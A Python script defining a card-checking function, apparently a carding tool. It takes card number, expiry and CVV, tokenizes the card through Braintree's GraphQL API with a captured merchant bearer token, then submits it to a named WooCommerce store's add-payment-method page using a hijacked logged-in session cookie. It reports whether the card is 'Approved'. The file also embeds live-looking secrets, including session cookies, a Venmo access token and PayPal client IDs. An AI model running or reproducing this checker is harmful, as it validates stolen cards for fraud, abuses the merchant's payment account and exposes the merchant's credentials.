def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	








	






















	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjUxODg5MzQsImp0aSI6ImExNmFmZWZlLWZkOWUtNGRiNi1iNzkwLTUxZTg4NWFlNTQwYSIsInN1YiI6Ino5YnNyOHdmcnN3bnEzaGMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ino5YnNyOHdmcnN3bnEzaGMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IkhpRmlIZWF2ZW5faW5zdGFudCJ9fQ.ICAkG7zagHu59ctZG2cxuKZ8XUGfrVUooVnIqSpo6PRb9OHmR-i1NmzykTYM_RYv7PmUIdlu0Oz4Ns1GV6j6BQ',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '2a582af5-4c89-4492-9bfc-62e8504b8bf8',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
                'billingAddress': {
                    'postalCode': '10080',
                    'streetAddress': 'hhfhfbfv',
                },
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"2a582af5-4c89-4492-9bfc-62e8504b8bf8"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5111972036167182","expirationMonth":"03","expirationYear":"2028","cvv":"793","billingAddress":{"postalCode":"10080","streetAddress":"hhfhfbfv"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
















	cookies = {
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-08-31%2011%3A07%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhifiheaven.net%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2024-08-31%2011%3A07%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhifiheaven.net%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '_gcl_au': '1.1.1238892640.1725102459',
    '_ga': 'GA1.1.1981033402.1725102459',
    'syf-widget-token': '641a242c-3a1e-4df7-bc99-42268cd05633',
    'syfToken': 'MPP5PI20967154175102462924',
    'PHPSESSID': '438b89e1a75d2b993b1ba617b129645c',
    'wordpress_logged_in_850f10c9ba618b6d56238d375dc3548b': 'lyy446333%7C1726312096%7CDc061Niv2ZAvIya8o7gruzle8fh1PStGc0CqbSXXByc%7C2365985d9c5bdb45357e0e873b8146c9b989eafc1ae5c38af00df67ce021f748',
    'wfwaf-authcookie-553de372f8ca4bbbc6f117e7ac8b3e96': '45067%7Cother%7Cread%7Cb4357682c008440e0273147974c862ca9e3f3bfa6dcbc328a10ad97ab4a16462',
    'sbjs_session': 'pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhifiheaven.net%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_074YKHQ041': 'GS1.1.1725102458.1.1.1725102566.0.0.0',
}

	headers = {
    'authority': 'hifiheaven.net',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-31%2011%3A07%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhifiheaven.net%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-31%2011%3A07%3A38%7C%7C%7Cep%3Dhttps%3A%2F%2Fhifiheaven.net%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _gcl_au=1.1.1238892640.1725102459; _ga=GA1.1.1981033402.1725102459; syf-widget-token=641a242c-3a1e-4df7-bc99-42268cd05633; syfToken=MPP5PI20967154175102462924; PHPSESSID=438b89e1a75d2b993b1ba617b129645c; wordpress_logged_in_850f10c9ba618b6d56238d375dc3548b=lyy446333%7C1726312096%7CDc061Niv2ZAvIya8o7gruzle8fh1PStGc0CqbSXXByc%7C2365985d9c5bdb45357e0e873b8146c9b989eafc1ae5c38af00df67ce021f748; wfwaf-authcookie-553de372f8ca4bbbc6f117e7ac8b3e96=45067%7Cother%7Cread%7Cb4357682c008440e0273147974c862ca9e3f3bfa6dcbc328a10ad97ab4a16462; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhifiheaven.net%2Fmy-account%2Fadd-payment-method%2F; _ga_074YKHQ041=GS1.1.1725102458.1.1.1725102566.0.0.0',
    'origin': 'https://hifiheaven.net',
    'pragma': 'no-cache',
    'referer': 'https://hifiheaven.net/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '{"device_session_id":"453fb3abe33b1dfdb0b129f51ac468af","fraud_merchant_id":null,"correlation_id":"2a582af5-4c89-4492-9bfc-62e8504b"}',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/z9bsr8wfrswnq3hc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/z9bsr8wfrswnq3hc"},"merchantId":"z9bsr8wfrswnq3hc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"z9bsr8wfrswnq3hc","supportedNetworks":["visa","mastercard","amex","discover"]},"kount":{"kountMerchantId":null},"challenges":["cvv","postal_code"],"creditCards":{"supportedCardTypes":["MasterCard","Visa","Discover","JCB","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Hi-Fi Heaven","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjUxODg5MzYsImp0aSI6ImM5NmQ3MzgyLWQyMDMtNDM1Ny1hYWE5LTZiNWI5N2VhOGQzNSIsInN1YiI6Ino5YnNyOHdmcnN3bnEzaGMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ino5YnNyOHdmcnN3bnEzaGMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6e319._k4HWzntg4d20wQEtdCTWy9bdekDQfp3CTqckxeiuFzVjMWhbmVMbnsW03VqKeQ72vnP7Pv4eW8Q9qsCf9IB5A","paypalClientId":"AdGchG6Q9wZne0If-hxdivPbLl0bKoWQjFfU_bYKAGN6vY6y4BxULdy57fs3sMIU5YoGHjw7sW_06yq2","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3846123145637229508","accessToken":"access_token$production$z9bsr8wfrswnq3hc$c40fec96a002eb24c77f35088efc5d1f","environment":"production","enrichedCustomerDataEnabled":true},"paypalEnabled":true,"paypal":{"displayName":"Hi-Fi Heaven","clientId":"AdGchG6Q9wZne0If-hxdivPbLl0bKoWQjFfU_bYKAGN6vY6y4BxULdy57fs3sMIU5YoGHjw7sW_06yq2","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"HiFiHeaven_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'billing_address_1': 'hhfhfbfv',
    'woocommerce-add-payment-method-nonce': 'be0c0804e3',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post('https://hifiheaven.net/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)
	text = response.text
	pattern = r'Reason: (.*?)\s*</li>'
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	return result


	
